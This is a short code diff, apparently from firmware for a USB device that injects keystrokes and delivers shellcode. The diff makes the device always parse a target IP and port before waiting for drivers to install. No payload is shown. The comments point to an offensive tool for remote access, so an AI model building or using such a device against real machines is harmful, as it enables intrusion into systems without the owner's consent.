@@ -22,10 +22,9 @@ void setup()
     delay(500);
     digitalWrite(ledPin, LOW);
     
-    //This evaluates our IP an port info, writing it to net_info for use
-    if (custom != true) {
-        parseNet(); //Only do this if we are using the normal shellcode
-    }
+    //This evaluates our IP ansd port info, writing it to net_info for use
+    parseNet();
+       
     // Wait for drivers to install.
     hurryUp();
 
